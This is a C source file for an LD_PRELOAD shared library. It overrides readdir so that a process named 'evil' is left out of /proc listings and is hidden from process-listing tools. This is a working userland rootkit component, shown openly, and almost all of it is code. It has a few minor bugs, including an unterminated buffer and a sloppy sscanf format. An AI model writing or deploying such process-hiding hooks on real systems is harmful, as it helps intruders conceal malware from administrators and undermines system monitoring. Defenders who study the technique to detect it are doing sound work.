#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int process_name(char* pid, char* processname)
{
    //only process pid dir
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char stat[128] = {0};
    snprintf(stat, sizeof(stat), "/proc/%s/stat", pid);

    //FILE* f = fopen(stat, "r");
    int fd = open(stat, O_RDONLY);
    if(fd < 0) {
        return 0;
    }

    if(read(fd, stat, sizeof(stat)) <= 0) {
        close(fd);
        return 0;
    }

    close(fd);

    int processid;
    sscanf(stat, "%d (%[^)]s", &processid, processname);
    return 1;
}

//process need hide
char * process_need_hide = "evil";

//point to real readdir
struct dirent* (*real_readdir)(DIR *dirp) = NULL;

//hook readir
struct dirent *readdir(DIR *dirp) {
    if(dirp == NULL)
        return NULL;
    if(real_readdir == NULL) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    if(real_readdir == NULL)
    {
        printf("Oops, hook readdir error\n");
        return NULL;
    }
    //printf("Oops, hook readdir\n");
    struct dirent *dir = real_readdir(dirp);
    char proc_name[1280] = {0};
    if(dir != NULL &&
            process_name(dir->d_name, proc_name) &&
            strcmp(proc_name, process_need_hide)==0)
    {
        printf("Greate, readdir skip process:%s\n", proc_name);
        //skip to next dir
        dir = real_readdir(dirp);
    }
    return dir;
}

